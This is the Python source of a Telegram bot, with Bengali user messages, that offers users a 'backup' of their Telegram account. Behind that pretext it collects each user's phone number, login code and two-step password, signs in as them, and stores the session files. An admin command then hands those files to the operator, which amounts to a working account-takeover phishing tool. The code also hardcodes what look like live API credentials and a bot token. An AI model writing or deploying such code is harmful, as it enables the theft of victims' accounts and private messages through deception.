import os
import time
import zipfile
from threading import Thread
from flask import Flask
import telebot
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError

# ==================== কনফিগারেশন ====================
API_ID = 36547444
API_HASH = "119a3ac4fd3dc368df92ae6d81f3bb3e"
BOT_TOKEN = "8970655570:AAGb0C4KmwkOzUxHNA29O6SHfJ2omqrUMJ4"
ADMIN_ID = 8095751648
# ===================================================

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

STORAGE_DIR = "user_backups"
if not os.path.exists(STORAGE_DIR):
    os.makedirs(STORAGE_DIR)

user_data = {}

@app.route('/')
def home():
    return "Bot is running perfectly!"

def run_web():
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)

# ওয়েব সার্ভার ব্যাকগ্রাউন্ডে স্টার্ট করা হচ্ছে
Thread(target=run_web, daemon=True).start()

@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = message.from_user.id
    if user_id == ADMIN_ID:
        bot.reply_to(
            message,
            "👋 স্বাগতম এডমিন ভাই!\n\n"
            "📊 স্টোরেজ চেক করতে: /status\n"
            "📦 জিপ ফাইল ডাউনলোড করতে: `/get [ফাইলের সংখ্যা]`"
        )
    else:
        bot.reply_to(
            message,
            "👋 স্বাগতম! আপনার টেলিগ্রাম আইডির একটি জিপ ফাইল ব্যাকআপ তৈরি করতে "
            "আপনার ফোন নম্বরটি আন্তর্জাতিক ফরম্যাটে পাঠান (যেমন: +88017XXXXXXXX)।"
        )

@bot.message_handler(commands=['status'])
def status_command(message):
    if message.from_user.id != ADMIN_ID:
        return
    files = [f for f in os.listdir(STORAGE_DIR) if f.endswith(".zip")]
    bot.reply_to(message, f"📊 বর্তমানে বটের স্টোরেজে মোট **{len(files)}টি** জিপ ফাইল জমা আছে।")

@bot.message_handler(commands=['get'])
def get_files(message):
    if message.from_user.id != ADMIN_ID:
        return
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "❌ সঠিক ফরম্যাট: `/get 5`")
        return
    try:
        count = int(args[1])
    except ValueError:
        bot.reply_to(message, "❌ ফাইলের সংখ্যাটি অবশ্যই সংখ্যা হতে হবে।")
        return

    all_zips = sorted([f for f in os.listdir(STORAGE_DIR) if f.endswith(".zip")])
    if not all_zips:
        bot.reply_to(message, "❌ স্টোরেজে কোনো জিপ ফাইল নেই।")
        return
    
    files_to_take = all_zips[:count]
    actual_count = len(files_to_take)
    bot.reply_to(message, f"📦 {actual_count}টি জিপ ফাইল প্রসেস করা হচ্ছে...")
    
    master_zip_name = f"Admin_Fetch_{actual_count}_files.zip"
    try:
        with zipfile.ZipFile(master_zip_name, 'w') as master_zip:
            for file_name in files_to_take:
                file_path = os.path.join(STORAGE_DIR, file_name)
                master_zip.write(file_path, arcname=file_name)
                os.remove(file_path)
        with open(master_zip_name, 'rb') as doc:
            bot.send_document(message.chat.id, doc, caption=f"✅ সফলভাবে {actual_count}টি জিপ ফাইল পাঠানো হলো।")
    except Exception as e:
        bot.reply_to(message, f"❌ সমস্যা হয়েছে: {str(e)}")
    finally:
        if os.path.exists(master_zip_name):
            os.remove(master_zip_name)

@bot.message_handler(func=lambda message: True)
def handle_text(message):
    user_id = message.from_user.id
    text = message.text.strip()

    if user_id == ADMIN_ID and not text.startswith("+") and user_id not in user_data:
        return

    if text.startswith("+"):
        phone_number = text
        bot.reply_to(message, "⏳ টেলিগ্রাম সার্ভারে ওটিপি পাঠানো হচ্ছে...")
        clean_phone = phone_number.replace("+", "").replace(" ", "")
        temp_session_path = os.path.join(STORAGE_DIR, f"temp_{clean_phone}")
        
        user_client = TelegramClient(temp_session_path, API_ID, API_HASH)
        user_client.connect()
        
        try:
            sent_code = user_client.send_code_request(phone_number)
            user_data[user_id] = {
                "client": user_client, "phone": phone_number,
                "phone_code_hash": sent_code.phone_code_hash,
                "clean_phone": clean_phone, "temp_path": temp_session_path
            }
            bot.reply_to(message, "📨 আপনার টেলিগ্রাম অ্যাপে যাওয়া ওটিপি কোডটি (OTP) এখানে পাঠান।")
        except Exception as e:
            bot.reply_to(message, f"❌ ওটিপি পাঠানো যায়নি: {str(e)}")
            user_client.disconnect()
            if os.path.exists(temp_session_path):
                os.remove(temp_session_path)

    elif user_id in user_data and "phone_code_hash" in user_data[user_id]:
        data = user_data[user_id]
        user_client = data["client"]
        
        if data.get("waiting_for_password"):
            try:
                user_client.sign_in(password=text)
                user_client.disconnect()
                session_file = data["temp_path"]
                final_zip_path = os.path.join(STORAGE_DIR, f"{data['clean_phone']}.zip")
                with zipfile.ZipFile(final_zip_path, 'w') as zipf:
                    if os.path.exists(session_file):
                        zipf.write(session_file, arcname=f"{data['clean_phone']}.session")
                if os.path.exists(session_file):
                    os.remove(session_file)
                bot.reply_to(message, "✅ অ্যাকাউন্টটি সফলভাবে যুক্ত ও ব্যাকআপ করা হয়েছে!")
                del user_data[user_id]
            except Exception as e:
                bot.reply_to(message, f"❌ ভুল পাসওয়ার্ড বা সমস্যা: {str(e)}\nআবার চেষ্টা করুন:")
        else:
            bot.reply_to(message, "⚙️ ভেরিফাই করা হচ্ছে...")
            try:
                user_client.sign_in(data["phone"], text, phone_code_hash=data["phone_code_hash"])
                user_client.disconnect()
                session_file = data["temp_path"]
                final_zip_path = os.path.join(STORAGE_DIR, f"{data['clean_phone']}.zip")
                with zipfile.ZipFile(final_zip_path, 'w') as zipf:
                    if os.path.exists(session_file):
                        zipf.write(session_file, arcname=f"{data['clean_phone']}.session")
                if os.path.exists(session_file):
                    os.remove(session_file)
                bot.reply_to(message, "✅ অ্যাকাউন্টটি সফলভাবে যুক্ত ও ব্যাকআপ করা হয়েছে!")
                del user_data[user_id]
            except SessionPasswordNeededError:
                bot.reply_to(message, "🔐 Two-Step Verification অন আছে। দয়া করে পাসওয়ার্ডটি দিন:")
                user_data[user_id]["waiting_for_password"] = True
            except Exception as e:
                bot.reply_to(message, f"❌ লগইন ব্যর্থ: {str(e)}")
                user_client.disconnect()
                if os.path.exists(data["temp_path"]):
                    os.remove(data["temp_path"])
                del user_data[user_id]

if __name__ == "__main__":
    print("--- Telebot Server is Starting ---")
    bot.infinity_polling()
